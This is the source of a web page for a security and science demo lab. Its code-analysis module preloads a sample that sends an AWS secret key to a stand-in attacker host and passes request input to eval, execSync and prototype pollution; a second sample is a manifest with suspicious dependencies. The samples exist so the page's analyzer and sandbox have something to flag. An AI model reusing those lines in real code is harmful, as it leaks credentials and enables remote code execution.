/* =============================================================================
   SENTINEL Omni-Lab — module controllers.

   Every interaction on this page goes through `document.modelContext`, the same
   WebMCP surface an external agent would use. Nothing is faked for the UI: the
   numbers on screen are whatever the tool actually returned.
   ========================================================================== */

import { $, el, fill, fmt, toast } from './ui.js';
import { webmcp, MetaLoop } from './webmcp.js';

/** Invoke a WebMCP tool, surfacing failures as a toast instead of a dead click. */
async function call(name, input) {
  try {
    return await webmcp.invoke(name, input ?? {});
  } catch (error) {
    toast(error && error.message ? error.message : `${name} failed`);
    throw error;
  }
}

/* ------------------------------------------------------------ canvas util */

/** Size a canvas to its CSS box at device resolution and return its context. */
function ctx2d(canvas) {
  if (!canvas || typeof canvas.getContext !== 'function') return null;
  const context = canvas.getContext('2d');
  if (!context) return null;
  const rect = canvas.getBoundingClientRect();
  const dpr = Math.min(window.devicePixelRatio || 1, 2);
  const width = Math.max(1, Math.round(rect.width || canvas.width));
  const height = Math.max(1, Math.round(rect.height || canvas.height));
  canvas.width = Math.round(width * dpr);
  canvas.height = Math.round(height * dpr);
  context.setTransform(dpr, 0, 0, dpr, 0, 0);
  context.clearRect(0, 0, width, height);
  return { g: context, w: width, h: height };
}

/** The faint square lattice every canvas in the lab sits on. */
function gridBackdrop(g, w, h, cell = 28) {
  g.strokeStyle = 'rgba(255,255,255,0.055)';
  g.lineWidth = 1;
  for (let x = 0; x <= w; x += cell) {
    g.beginPath();
    g.moveTo(Math.floor(x) + 0.5, 0);
    g.lineTo(Math.floor(x) + 0.5, h);
    g.stroke();
  }
  for (let y = 0; y <= h; y += cell) {
    g.beginPath();
    g.moveTo(0, Math.floor(y) + 0.5);
    g.lineTo(w, Math.floor(y) + 0.5);
    g.stroke();
  }
}

/** Severity → monochrome weight. The palette is greyscale by design. */
const WEIGHT = { critical: 1, high: 0.78, medium: 0.56, moderate: 0.56, low: 0.34 };
const grey = (level) => {
  const v = Math.round(90 + (WEIGHT[String(level).toLowerCase()] ?? 0.4) * 165);
  return `rgb(${v},${v},${v})`;
};

function setMeter(id, pct) {
  const bar = document.getElementById(id);
  if (bar) bar.style.width = `${Math.max(0, Math.min(100, Number(pct) || 0))}%`;
}

function setStatus(node, text, level) {
  if (!node) return;
  node.textContent = text;
  node.setAttribute('data-level', level);
}

/* ========================================================================= */
/* MODULE 1 — BREACHLAB                                                      */
/* ========================================================================= */

const SAMPLE_RCE = `// CVE-2026-9042: Supply-Chain Remote Code Execution & Secret Theft
const express = require('express');
const { execSync } = require('child_process');
const app = express();

app.post('/api/webhook', (req, res) => {
  const payload = req.query.cmd;
  const token = process.env.AWS_SECRET_ACCESS_KEY;

  // Exfiltrate credentials to an attacker-controlled host
  fetch("https://evil-cve-stealer.internal/leak?k=" + token);

  // Dynamic execution of untrusted input
  const result = eval(payload);
  execSync("bash -c '" + req.body.script + "'");

  obj.__proto__.isAdmin = true;
  res.json({ result });
});`;

const SAMPLE_MANIFEST = `{
  "name": "vulnerable-service",
  "version": "1.0.0",
  "dependencies": {
    "express": "^4.17.1",
    "lodash": "*",
    "event-stream-flat": "latest",
    "colors-corrupt": ">=1.0.0",
    "axios": "^0.21.0"
  }
}`;

let breachGraph = { nodes: [], edges: [] };

function initBreachLab() {
  const input = $('#breachInput');
  if (!input) return;
  input.value = SAMPLE_RCE;

  $('#loadRce')?.addEventListener('click', () => {
    input.value = SAMPLE_RCE;
    toast('Zero-day sample loaded');
  });
  $('#loadManifest')?.addEventListener('click', () => {
    input.value = SAMPLE_MANIFEST;
    toast('Poisoned manifest loaded');
  });
  $('#runBreach')?.addEventListener('click', runBreachAnalysis);

  $('#btnDetonate')?.addEventListener('click', async () => {
    const report = await call('breachlab_detonate_sandbox', {
      code: input.value,
      timeoutMs: 2000,
    });
    const lines = [
      `[sandbox] container booted · isolated runtime`,
      `[sandbox] execution window ${report.executionTimeMs}ms${report.timedOut ? ' (timed out)' : ''}`,
      '',
      ...report.interceptedEvents.map(
        (e) =>
          `[${e.blocked ? 'BLOCKED' : 'ALLOW  '}] ${e.action} → ${e.target}\n           ${e.alert}`,
      ),
      '',
      ...report.stdout.map((line) => `[stdout] ${line}`),
      '',
      `[verdict] ${report.safeToRun ? 'SAFE TO RUN' : 'QUARANTINED'} · ${report.quarantinedThreats.length} threat(s)`,
      ...report.quarantinedThreats.map((t) => `           · ${t}`),
    ];
    const out = $('#sandboxOut');
    if (out) out.textContent = lines.join('\n');
    const tag = $('#detonateTag');
    if (tag) tag.textContent = `${report.interceptedEvents.length} intercepted`;
    toast(report.safeToRun ? 'Detonation clean' : 'Threats quarantined');
  });

  $('#btnTaint')?.addEventListener('click', async () => {
    const trace = await call('breachlab_trace_taint_flow', { code: input.value });
    const lines = [
      `[taint] source pattern: ${trace.sourcePattern}`,
      `[taint] sink pattern:   ${trace.sinkPattern}`,
      `[taint] tainted vars:   ${trace.taintedVariables.join(', ') || 'none'}`,
      '',
      ...trace.taintTrace.map(
        (step) => `  L${String(step.line).padStart(3, ' ')}  ${step.type.padEnd(11, ' ')} ${step.text}`,
      ),
      '',
      trace.isVulnerable
        ? '[verdict] REACHABLE — untrusted input reaches an execution sink.'
        : '[verdict] No source-to-sink path found.',
    ];
    const out = $('#sandboxOut');
    if (out) out.textContent = lines.join('\n');
    toast(trace.isVulnerable ? 'Taint path found' : 'No taint path');
  });

  $('#btnHotpatch')?.addEventListener('click', async () => {
    const patch = await call('breachlab_generate_hotpatch', { code: input.value });
    const out = $('#hotpatchOut');
    if (out) {
      const nodes = patch.diff.length
        ? patch.diff.map((line) =>
            el('span', {
              class: `diff-line ${line.startsWith('+') ? 'add' : line.startsWith('-') ? 'del' : ''}`,
              text: line,
            }),
          )
        : [el('span', { class: 'diff-line', text: '// no rewritable sinks found' })];
      fill(out, [
        ...nodes,
        el('span', { class: 'diff-line', text: '' }),
        ...patch.fixesApplied.map((fix) =>
          el('span', { class: 'diff-line', text: `// fix applied: ${fix}` }),
        ),
      ]);
    }
    const tag = $('#patchGainTag');
    if (tag) tag.textContent = `+${patch.securityScoreImprovement} security score`;
    toast(`Hotpatch synthesised (+${patch.securityScoreImprovement})`);
  });

  runBreachAnalysis();
}

async function runBreachAnalysis() {
  const input = $('#breachInput');
  if (!input) return;
  const result = await call('breachlab_analyze_cve_ast', {
    codeOrManifest: input.value,
    checkSupplyChain: true,
  });

  breachGraph = result.graph;

  const level =
    result.verdict === 'SAFE' ? 'ok' : result.verdict === 'SUSPICIOUS' ? 'warn' : 'alert';
  setStatus($('#breachVerdict'), result.verdict.replace(/_/g, ' '), level);

  const entropy = $('#entropyTag');
  if (entropy) entropy.textContent = `entropy ${result.astMetrics.entropy}`;

  const setText = (id, value) => {
    const node = document.getElementById(id);
    if (node) node.textContent = value;
  };
  setText('mThreat', `${result.threatScore}`);
  const threatNode = $('#mThreat');
  if (threatNode) {
    fill(threatNode, [
      document.createTextNode(String(result.threatScore)),
      el('span', { style: 'font-size:0.9rem', text: '/100' }),
    ]);
  }
  setMeter('mThreatBar', result.threatScore);
  setText('mCalls', String(result.astMetrics.dangerousCallsCount));
  setText('mFindings', String(result.findings.length));

  const maxBlast = result.graph.nodes.reduce((m, n) => Math.max(m, n.blastRadius || 0), 0);
  setText('mBlast', `${maxBlast}%`);
  setMeter('mBlastBar', maxBlast);
  setText('graphNodeTag', `${result.graph.nodes.length} nodes`);
  setText('findingsTag', `${result.findings.length} findings`);

  fill(
    $('#findingsList'),
    result.findings.length
      ? result.findings.map((f) =>
          el('div', { class: 'row-item' }, [
            el('div', {}, [
              el('h4', { text: `${f.type.replace(/_/g, ' ')} · line ${f.line}` }),
              el('p', { text: f.description }),
              el('p', { text: `fix: ${f.remediation}` }),
            ]),
            el('span', { class: 'status', 'data-level': f.severity === 'CRITICAL' ? 'alert' : f.severity === 'HIGH' ? 'warn' : 'ok', text: f.severity }),
          ]),
        )
      : [el('div', { class: 'row-item' }, [el('p', { text: 'No findings. Input looks clean.' })])],
  );

  drawAttackGraph();
}

function drawAttackGraph() {
  const canvas = $('#attackGraph');
  const surface = ctx2d(canvas);
  if (!surface) return;
  const { g, w, h } = surface;
  gridBackdrop(g, w, h);

  const nodes = breachGraph.nodes || [];
  if (nodes.length === 0) {
    g.fillStyle = 'rgba(255,255,255,0.35)';
    g.font = '12px ui-monospace, monospace';
    g.fillText('// no graph — run an analysis', 16, 26);
    return;
  }

  // Entry node centred left, everything else on an arc to its right.
  const pos = new Map();
  const cx = w * 0.5;
  const cy = h * 0.5;
  const radius = Math.min(w, h) * 0.36;
  nodes.slice(0, 14).forEach((node, index, arr) => {
    if (index === 0) {
      pos.set(node.id, { x: w * 0.14, y: cy });
      return;
    }
    const angle = ((index - 1) / Math.max(1, arr.length - 1)) * Math.PI * 1.55 - Math.PI * 0.77;
    pos.set(node.id, { x: cx + Math.cos(angle) * radius * 1.15, y: cy + Math.sin(angle) * radius });
  });

  // Edges first so squares sit on top.
  (breachGraph.edges || []).forEach((edge) => {
    const a = pos.get(edge.from);
    const b = pos.get(edge.to);
    if (!a || !b) return;
    g.beginPath();
    g.moveTo(a.x, a.y);
    g.lineTo(b.x, b.y);
    g.strokeStyle = edge.tainted ? 'rgba(255,255,255,0.6)' : 'rgba(255,255,255,0.18)';
    g.lineWidth = edge.tainted ? 1.6 : 1;
    if (!edge.tainted) g.setLineDash([3, 4]);
    g.stroke();
    g.setLineDash([]);
  });

  // Boxy nodes: squares, never circles.
  nodes.slice(0, 14).forEach((node) => {
    const p = pos.get(node.id);
    if (!p) return;
    const size = 13 + (node.blastRadius || 0) / 9;
    const half = size / 2;
    const shade = grey(node.severity);

    g.fillStyle = '#000';
    g.fillRect(p.x - half, p.y - half, size, size);
    g.strokeStyle = shade;
    g.lineWidth = node.type === 'sink' || node.type === 'exfil' ? 2.4 : 1.4;
    g.strokeRect(p.x - half, p.y - half, size, size);

    if (node.severity === 'critical') {
      g.fillStyle = shade;
      g.fillRect(p.x - half + 3, p.y - half + 3, size - 6, size - 6);
    }

    g.fillStyle = 'rgba(255,255,255,0.7)';
    g.font = '10px ui-monospace, monospace';
    g.textAlign = 'center';
    g.fillText(fmt.clip(node.label, 18), p.x, p.y + half + 13);
    g.textAlign = 'left';
  });
}

/* ========================================================================= */
/* MODULE 2 — BIOSYNTH                                                       */
/* ========================================================================= */

let protein = { atoms: [], sequence: [] };
let rotation = 0.6;
let dragging = false;
let lastX = 0;
let highlightRes = null;

function initBioSynth() {
  const canvas = $('#proteinCanvas');
  if (!canvas) return;

  canvas.addEventListener('pointerdown', (event) => {
    dragging = true;
    lastX = event.clientX;
    canvas.setPointerCapture(event.pointerId);
  });
  canvas.addEventListener('pointermove', (event) => {
    if (!dragging) return;
    rotation += (event.clientX - lastX) * 0.012;
    lastX = event.clientX;
    drawProtein();
  });
  const stop = () => {
    dragging = false;
  };
  canvas.addEventListener('pointerup', stop);
  canvas.addEventListener('pointercancel', stop);

  $('#loadProtein')?.addEventListener('click', () => loadProtein(true));
  $('#scanPockets')?.addEventListener('click', scanPockets);
  $('#btnMutate')?.addEventListener('click', runMutation);

  loadProtein(false);
}

async function loadProtein(announce) {
  protein = await call('biosynth_load_pdb_structure', {});
  const badge = $('#atomBadge');
  if (badge) badge.textContent = `${protein.atoms.length} atoms · ${protein.sequence.length} residues`;
  highlightRes = null;
  drawProtein();
  await scanPockets();
  if (announce) toast('Crambin 1CRN loaded');
}

async function scanPockets() {
  const pockets = await call('biosynth_highlight_binding_pockets', {});
  const tag = $('#pocketTag');
  if (tag) tag.textContent = `${pockets.length} pockets`;

  fill(
    $('#pocketGrid'),
    pockets.length
      ? pockets.map((p) =>
          el('div', { class: 'box box-pad ticked shine' }, [
            el('div', { class: 'metric-k', text: p.id }),
            el('div', { class: 'metric-v', text: String(p.druggabilityScore) }),
            el('div', { class: 'metric-note', text: `druggability · volume ${p.volumeScore} Å³` }),
            el('div', { class: 'meter' }, [
              el('i', { style: `width:${Math.round(p.druggabilityScore * 100)}%` }),
            ]),
            el('p', {
              class: 'dim',
              style: 'margin-top:10px;font-size:0.72rem;font-family:var(--font-mono)',
              text: `lining: ${p.liningResidues.map((r) => `${r.name}${r.seq}`).join(' ')}`,
            }),
          ]),
        )
      : [el('p', { class: 'dim', text: 'No large catalytic pockets detected in this fragment.' })],
  );
}

async function runMutation() {
  const chain = ($('#mutChain')?.value || 'A').trim().toUpperCase();
  const resSeq = Number($('#mutSeq')?.value || 2);
  const target = $('#mutTarget')?.value || 'TRP';

  const sim = await call('biosynth_mutate_residue', {
    chain,
    resSeq,
    targetResidue3: target,
  });

  highlightRes = { chain, resSeq };

  const ddg = $('#mDdg');
  if (ddg) ddg.textContent = `${sim.deltaDeltaG > 0 ? '+' : ''}${sim.deltaDeltaG}`;
  const note = $('#mDdgNote');
  if (note) {
    note.textContent = `kcal/mol · ${sim.originalResidue} → ${sim.mutatedResidue} · ${sim.stabilityVerdict.replace(/_/g, ' ').toLowerCase()}`;
  }
  const clashCount = $('#mClashes');
  if (clashCount) clashCount.textContent = String(sim.stericClashes.length);

  const destabilising =
    sim.stabilityVerdict.includes('CLASH') || sim.stabilityVerdict.includes('DESTABILIZING');
  setStatus($('#mutBadge'), sim.stabilityVerdict.replace(/_/g, ' '), destabilising ? 'alert' : 'ok');

  fill(
    $('#clashList'),
    sim.stericClashes.length
      ? sim.stericClashes.map((c) =>
          el('div', { class: 'row-item' }, [
            el('div', {}, [
              el('h4', { text: `${c.atom1} ↔ ${c.atom2}` }),
              el('p', { text: `${c.distanceAngstroms} Å separation` }),
            ]),
            el('span', {
              class: 'status',
              'data-level': c.clashSeverity === 'CRITICAL' ? 'alert' : 'warn',
              text: c.clashSeverity,
            }),
          ]),
        )
      : [el('div', { class: 'row-item' }, [el('p', { text: 'No steric clashes. Clean structural fit.' })])],
  );

  const rec = $('#bioRec');
  if (rec) rec.textContent = sim.recommendation;

  drawProtein();
  toast(`ΔΔG ${sim.deltaDeltaG > 0 ? '+' : ''}${sim.deltaDeltaG} kcal/mol`);
}

function drawProtein() {
  const surface = ctx2d($('#proteinCanvas'));
  if (!surface) return;
  const { g, w, h } = surface;
  gridBackdrop(g, w, h, 32);

  const atoms = protein.atoms || [];
  if (atoms.length === 0) return;

  const centre = atoms.reduce(
    (acc, a) => ({ x: acc.x + a.x / atoms.length, y: acc.y + a.y / atoms.length, z: acc.z + a.z / atoms.length }),
    { x: 0, y: 0, z: 0 },
  );

  const scale = Math.min(w, h) / 22;
  const projected = atoms
    .map((a) => {
      const rx = a.x - centre.x;
      const ry = a.y - centre.y;
      const rz = a.z - centre.z;
      return {
        ...a,
        px: w / 2 + (rx * Math.cos(rotation) + rz * Math.sin(rotation)) * scale,
        py: h / 2 - ry * scale,
        depth: -rx * Math.sin(rotation) + rz * Math.cos(rotation),
      };
    })
    .sort((a, b) => a.depth - b.depth);

  // Backbone trace.
  g.strokeStyle = 'rgba(255,255,255,0.28)';
  g.lineWidth = 2;
  g.beginPath();
  for (let i = 0; i < projected.length - 1; i += 1) {
    const p1 = projected[i];
    const p2 = projected[i + 1];
    if (Math.abs(p1.resSeq - p2.resSeq) <= 1) {
      g.moveTo(p1.px, p1.py);
      g.lineTo(p2.px, p2.py);
    }
  }
  g.stroke();

  // Atoms as depth-scaled squares; element encoded by fill style, not hue.
  projected.forEach((a) => {
    const size = Math.max(5, 10 + a.depth * 0.42);
    const half = size / 2;
    const lit = 0.45 + Math.min(0.55, (a.depth + 8) / 26);
    const isTarget =
      highlightRes && a.chain === highlightRes.chain && a.resSeq === highlightRes.resSeq;

    g.fillStyle = '#000';
    g.fillRect(a.px - half, a.py - half, size, size);
    g.strokeStyle = `rgba(255,255,255,${lit})`;
    g.lineWidth = isTarget ? 2.4 : 1.2;
    g.strokeRect(a.px - half, a.py - half, size, size);

    if (a.element === 'N') {
      g.fillStyle = `rgba(255,255,255,${lit * 0.85})`;
      g.fillRect(a.px - half + 2, a.py - half + 2, size - 4, size - 4);
    } else if (a.element === 'O') {
      g.strokeStyle = `rgba(255,255,255,${lit})`;
      g.beginPath();
      g.moveTo(a.px - half, a.py - half);
      g.lineTo(a.px + half, a.py + half);
      g.moveTo(a.px + half, a.py - half);
      g.lineTo(a.px - half, a.py + half);
      g.stroke();
    } else if (a.element === 'S') {
      g.strokeRect(a.px - half + 3, a.py - half + 3, size - 6, size - 6);
    }

    if (isTarget) {
      g.strokeStyle = '#fff';
      g.lineWidth = 1;
      g.setLineDash([2, 3]);
      g.strokeRect(a.px - half - 5, a.py - half - 5, size + 10, size + 10);
      g.setLineDash([]);
    }

    if (a.name === 'CA') {
      g.fillStyle = 'rgba(255,255,255,0.55)';
      g.font = '9px ui-monospace, monospace';
      g.fillText(`${a.resName}${a.resSeq}`, a.px + half + 3, a.py - 3);
    }
  });
}

/* ========================================================================= */
/* MODULE 3 — CHRONOFORENSIC                                                 */
/* ========================================================================= */

let feeds = [];
let triangulation = null;

function initChrono() {
  if (!$('#feedList')) return;
  $('#loadFeeds')?.addEventListener('click', () => loadFeeds(true));
  $('#runTriangulate')?.addEventListener('click', runTriangulation);
  $('#buildDossier')?.addEventListener('click', buildDossier);
  loadFeeds(false);
}

async function loadFeeds(announce) {
  feeds = await call('chrono_load_media_streams', {});
  const badge = $('#feedBadge');
  if (badge) badge.textContent = `${feeds.length} streams`;

  const reference = feeds[0];
  const rows = await Promise.all(
    feeds.map(async (feed) => {
      const sync = await call('chrono_sync_flash_audio_markers', {
        referenceFeedId: reference.id,
        targetFeedId: feed.id,
      });
      return el('div', { class: 'row-item' }, [
        el('div', {}, [
          el('h4', { text: `${feed.sourceName}` }),
          el('p', {
            text: `${feed.cameraType} · ${feed.recordedFps} fps · pos (${feed.geoPosition.x}, ${feed.geoPosition.y}, ${feed.geoPosition.z}) m`,
          }),
          el('p', {
            text: `flash ${feed.opticalEvents[0]?.timestampSec}s · acoustic ${feed.acousticEvents[0]?.timestampSec}s · conf ${sync.confidenceScore}`,
          }),
        ]),
        el('span', {
          class: 'row-val',
          text: `${sync.calculatedOffsetMs >= 0 ? '+' : ''}${sync.calculatedOffsetMs} ms`,
        }),
      ]);
    }),
  );
  fill($('#feedList'), rows);
  drawChronoMap();
  if (announce) toast('Incident feeds loaded');
}

async function runTriangulation() {
  triangulation = await call('chrono_triangulate_acoustic_source', {});
  const loc = triangulation.estimatedSourceLocation;
  const origin = $('#mOrigin');
  if (origin) origin.textContent = `(${loc.x}, ${loc.y}, ${loc.z})`;
  const radius = $('#mRadius');
  if (radius) radius.textContent = `±${triangulation.confidenceRadiusMeters}m`;
  const sensors = $('#mSensors');
  if (sensors) sensors.textContent = String(triangulation.sensorCount);
  drawChronoMap();
  toast('TDOA converged');
}

async function buildDossier() {
  const dossier = await call('chrono_generate_forensic_dossier', {
    incidentId: `INC-${new Date().toISOString().slice(0, 10)}`,
  });
  const hash = $('#dossierHash');
  if (hash) hash.textContent = `SHA-256 ${dossier.forensicHash.slice(0, 16)}…`;

  fill(
    $('#timelineBody'),
    dossier.timelineSequence.map((entry) =>
      el('tr', {}, [
        el('td', { class: 'mono', text: `T+${entry.timestampMs}` }),
        el('td', { text: entry.eventLabel }),
        el('td', { class: 'mono', text: entry.detectedByFeeds.join(', ') }),
        el('td', {}, [
          el('span', {
            class: 'status',
            'data-level': entry.confidence > 0.95 ? 'ok' : 'warn',
            text: `${Math.round(entry.confidence * 100)}%`,
          }),
        ]),
      ]),
    ),
  );
  toast('Dossier sealed');
}

function drawChronoMap() {
  const surface = ctx2d($('#chronoMap'));
  if (!surface) return;
  const { g, w, h } = surface;
  gridBackdrop(g, w, h, 30);

  const cx = w / 2;
  const cy = h / 2;
  const scale = Math.min(w, h) / 130;

  // Axes.
  g.strokeStyle = 'rgba(255,255,255,0.2)';
  g.lineWidth = 1;
  g.beginPath();
  g.moveTo(0, cy);
  g.lineTo(w, cy);
  g.moveTo(cx, 0);
  g.lineTo(cx, h);
  g.stroke();

  feeds.forEach((feed) => {
    const x = cx + feed.geoPosition.x * scale;
    const y = cy - feed.geoPosition.y * scale;
    g.fillStyle = '#000';
    g.fillRect(x - 6, y - 6, 12, 12);
    g.strokeStyle = '#fff';
    g.lineWidth = 1.5;
    g.strokeRect(x - 6, y - 6, 12, 12);
    g.fillStyle = 'rgba(255,255,255,0.65)';
    g.font = '9px ui-monospace, monospace';
    g.fillText(feed.id, x + 10, y + 3);
  });

  if (!triangulation) return;
  const ox = cx + triangulation.estimatedSourceLocation.x * scale;
  const oy = cy - triangulation.estimatedSourceLocation.y * scale;

  // Concentric confidence squares — boxy, not circular.
  [46, 30, 16].forEach((size, index) => {
    g.strokeStyle = `rgba(255,255,255,${0.18 + index * 0.16})`;
    g.lineWidth = 1;
    g.setLineDash([4, 4]);
    g.strokeRect(ox - size, oy - size, size * 2, size * 2);
    g.setLineDash([]);
  });

  g.fillStyle = '#fff';
  g.fillRect(ox - 5, oy - 5, 10, 10);
  g.fillStyle = 'rgba(255,255,255,0.85)';
  g.font = '10px ui-monospace, monospace';
  g.fillText('triangulated origin', ox + 12, oy - 10);
}

/* ========================================================================= */
/* MODULE 4 — METALOOP                                                       */
/* ========================================================================= */

let traceSteps = [];

function initMetaLoop() {
  if (!$('#traceTree')) return;
  $('#loadTrace')?.addEventListener('click', () => resetTrace(true));
  $('#btnInspect')?.addEventListener('click', inspectTrace);
  $('#btnMitigate')?.addEventListener('click', mitigateDrift);
  $('#btnFork')?.addEventListener('click', forkTrace);
  resetTrace(false);
}

function resetTrace(announce) {
  traceSteps = MetaLoop.DEMO_AGENT_TRACES.map((step) => ({ ...step }));
  renderTrace();
  inspectTrace();
  if (announce) toast('Trapped trace restored');
}

function renderTrace() {
  const tag = $('#traceTag');
  if (tag) tag.textContent = `${traceSteps.length} steps`;

  fill(
    $('#traceTree'),
    traceSteps.map((step) => {
      const synthetic = String(step.stepId).includes('syn') || String(step.parentId || '').includes('syn');
      const cls = `trace-node ${step.status === 'LOOP_DETECTED' ? 'loop' : synthetic ? 'forked' : ''}`;
      return el('div', { class: cls }, [
        el('div', { class: 'trace-meta' }, [
          el('span', { text: `${step.stepId} · ${String(step.agentRole).toUpperCase()} [${step.actionType}]` }),
          el('span', {
            class: 'status',
            'data-level': step.status === 'LOOP_DETECTED' ? 'alert' : step.status === 'DRIFTING' ? 'warn' : 'ok',
            text: step.status,
          }),
        ]),
        el('div', { class: 'trace-body' }, [
          step.toolName ? el('code', { text: `tool: ${step.toolName}` }) : null,
          step.thoughtSummary ? el('div', { text: step.thoughtSummary }) : null,
        ]),
        el('div', {
          class: 'trace-cost',
          text: `tokens ${step.tokenCost} · entropy ${step.entropyScore}`,
        }),
      ]);
    }),
  );
}

async function inspectTrace() {
  const result = await call('metaloop_inspect_trace_tree', {});
  const health = $('#mHealth');
  if (health) health.textContent = `${result.healthScore}%`;
  setMeter('mHealthBar', result.healthScore);
  const tokens = $('#mTokens');
  if (tokens) tokens.textContent = String(result.totalTokens);
  const tag = $('#anomalyTag');
  if (tag) tag.textContent = `${result.anomalies.length} anomalies`;

  setStatus(
    $('#swarmBadge'),
    result.anomalies.length
      ? `Loop trapped · ${result.healthScore}%`
      : `Healthy · ${result.healthScore}%`,
    result.anomalies.length ? 'alert' : 'ok',
  );

  fill(
    $('#anomalyList'),
    result.anomalies.length
      ? result.anomalies.map((a) =>
          el('div', { class: 'row-item' }, [
            el('div', {}, [
              el('h4', { text: a.anomalyType.replace(/_/g, ' ') }),
              el('p', { text: a.description }),
              el('p', { text: `mitigation: ${a.recommendedMitigation}` }),
            ]),
            el('span', {
              class: 'status',
              'data-level': a.severity === 'CRITICAL' ? 'alert' : 'warn',
              text: a.severity,
            }),
          ]),
        )
      : [el('div', { class: 'row-item' }, [el('p', { text: 'No anomalies. Swarm nominal.' })])],
  );
}

async function forkTrace() {
  let payload = {};
  try {
    payload = JSON.parse($('#forkPayload')?.value || '{}');
  } catch {
    toast('Payload is not valid JSON');
    return;
  }

  const result = await call('metaloop_inject_synthetic_tool', {
    forkPointStepId: $('#forkStep')?.value || 'step_2',
    syntheticToolName: 'search_nvd_database',
    syntheticOutput: payload,
  });

  traceSteps = result.forkedSteps;
  renderTrace();
  setStatus($('#swarmBadge'), `Recovered · ${result.recoveryStatus}`, 'ok');
  const health = $('#mHealth');
  if (health) health.textContent = '95%';
  setMeter('mHealthBar', 95);
  fill($('#anomalyList'), [
    el('div', { class: 'row-item' }, [
      el('div', {}, [
        el('h4', { text: 'Branch forked' }),
        el('p', { text: `${result.originalBranchId} → ${result.newBranchId}` }),
      ]),
      el('span', { class: 'status', 'data-level': 'ok', text: result.recoveryStatus }),
    ]),
  ]);
  toast(`Forked → ${result.newBranchId}`);
}

async function mitigateDrift() {
  const mitigation = await call('metaloop_mitigate_drift', {});
  const out = $('#driftOut');
  if (out) {
    out.textContent = `${mitigation.systemPatch}\n\nRecovery action: ${mitigation.recoveryAction}`;
  }
  toast('Mitigation synthesised');
}

/* ========================================================================= */
/* MODULE 5 — ZK ESCROW                                                      */
/* ========================================================================= */

let contract = null;

function initEscrow() {
  if (!$('#milestoneList')) return;
  $('#initContract')?.addEventListener('click', () => initContract(true));
  $('#btnVerify')?.addEventListener('click', verifyDeliverable);
  $('#btnRelease')?.addEventListener('click', signRelease);
  $('#milestoneSelect')?.addEventListener('change', syncMilestoneFields);
  initContract(false);
}

async function initContract(announce) {
  contract = await call('zkescrow_initiate_contract', {
    contractorName: 'Alice Cryptography Labs',
    clientName: 'Bob Decentralized Corp',
    milestones: [
      {
        title: 'Milestone 1: Zero-Day Hotpatch AST Module',
        payoutAmountUsd: 1500,
        expectedContent: 'function patchVulnerability(ast) { return sanitize(ast); }',
        acceptanceCriteria: ['Must parse AST', 'Must eliminate eval'],
      },
      {
        title: 'Milestone 2: 3D Protein CAD Viewer',
        payoutAmountUsd: 2000,
        expectedContent: 'function render3dProtein(pdb) { return WebGL.draw(pdb); }',
        acceptanceCriteria: ['Must render PDB atoms', 'Must compute clashes'],
      },
    ],
  });

  const set = (id, value) => {
    const node = document.getElementById(id);
    if (node) node.textContent = value;
  };
  set('escrowId', contract.contractId);
  set('escrowClient', fmt.clip(contract.clientPublicKey, 22));
  set('escrowContractor', fmt.clip(contract.contractorPublicKey, 22));
  set('escrowArbiter', contract.arbiterAgentId);
  set('escrowTotal', `$${contract.totalEscrowAmountUsd.toLocaleString('en-US')} USD`);
  setStatus($('#contractBadge'), contract.contractState, 'ok');
  setStatus($('#verdictBadge'), 'Unverified', 'warn');

  fill(
    $('#milestoneSelect'),
    contract.milestones.map((m) => el('option', { value: m.id, text: `${m.id} — ${m.title}` })),
  );

  const proof = $('#proofOut');
  if (proof) proof.textContent = '';

  renderMilestones();
  syncMilestoneFields();
  if (announce) toast('Contract funded');
}

function currentMilestone() {
  const id = $('#milestoneSelect')?.value;
  return contract?.milestones.find((m) => m.id === id) || contract?.milestones[0];
}

function syncMilestoneFields() {
  const milestone = currentMilestone();
  if (!milestone) return;
  const box = $('#deliverable');
  if (box) box.value = milestone.expectedContent || '';
  const expected = $('#expectedHash');
  if (expected) expected.textContent = `${milestone.expectedFileSha256.slice(0, 20)}…`;
  const computed = $('#computedHash');
  if (computed) computed.textContent = '—';
}

function renderMilestones() {
  fill(
    $('#milestoneList'),
    (contract?.milestones || []).map((m) =>
      el('div', { class: 'row-item' }, [
        el('div', {}, [
          el('h4', { text: m.title }),
          el('p', { text: `$${m.payoutAmountUsd} USD · digest ${m.expectedFileSha256.slice(0, 12)}…` }),
          el('p', { text: `criteria: ${m.acceptanceCriteria.join(' · ')}` }),
        ]),
        el('span', {
          class: 'status',
          'data-level': m.status === 'RELEASED' ? 'alert' : m.status === 'VERIFIED' ? 'ok' : 'warn',
          text: m.status,
        }),
      ]),
    ),
  );
}

async function verifyDeliverable() {
  const milestone = currentMilestone();
  if (!milestone) return;
  const result = await call('zkescrow_verify_deliverable_hash', {
    milestoneId: milestone.id,
    submittedContent: $('#deliverable')?.value || '',
  });

  const computed = $('#computedHash');
  if (computed) computed.textContent = `${result.actualSha256.slice(0, 20)}…`;
  const expected = $('#expectedHash');
  if (expected) expected.textContent = `${result.expectedSha256.slice(0, 20)}…`;

  setStatus(
    $('#verdictBadge'),
    result.arbitrationVerdict.replace(/_/g, ' '),
    result.arbitrationVerdict === 'APPROVED_FOR_RELEASE' ? 'ok' : 'alert',
  );

  // The catalog tool mutates its own demo contract, so mirror the status here.
  milestone.status = result.hashMatch && result.testSuitePassed ? 'VERIFIED' : 'DISPUTED';
  renderMilestones();

  toast(result.hashMatch ? 'Digest matched' : 'Digest mismatch — rejected');
}

async function signRelease() {
  const milestone = currentMilestone();
  if (!milestone) return;
  try {
    const proof = await call('zkescrow_sign_escrow_release', { milestoneId: milestone.id });
    const out = $('#proofOut');
    if (out) out.textContent = fmt.json(proof);
    milestone.status = 'RELEASED';
    renderMilestones();
    setStatus($('#contractBadge'), 'Funds released', 'alert');
    toast(`Released $${proof.releasedAmountUsd}`);
  } catch {
    // `call` already surfaced the refusal: release requires a VERIFIED milestone.
    const out = $('#proofOut');
    if (out) {
      out.textContent =
        '// Release refused.\n// A milestone must verify against its contractual SHA-256 digest\n// before the arbiter will sign an HMAC release proof.';
    }
  }
}

/* ========================================================================= */
/* BOOT                                                                      */
/* ========================================================================= */

function showRegistryStatus() {
  const text = $('#registryText');
  if (text) {
    text.textContent = `${webmcp.registeredCount} WebMCP tools${webmcp.polyfilled ? ' · polyfill' : ' · native'}`;
  }
}

/** Open the module named in the URL hash, so deep links from the home page work. */
function openFromHash() {
  const id = location.hash.replace('#', '');
  if (!id) return;
  const btn = document.querySelector(`.rail-btn[data-tab="${CSS.escape(id)}"]`);
  if (btn) btn.click();
}

function start() {
  showRegistryStatus();
  initBreachLab();
  initBioSynth();
  initChrono();
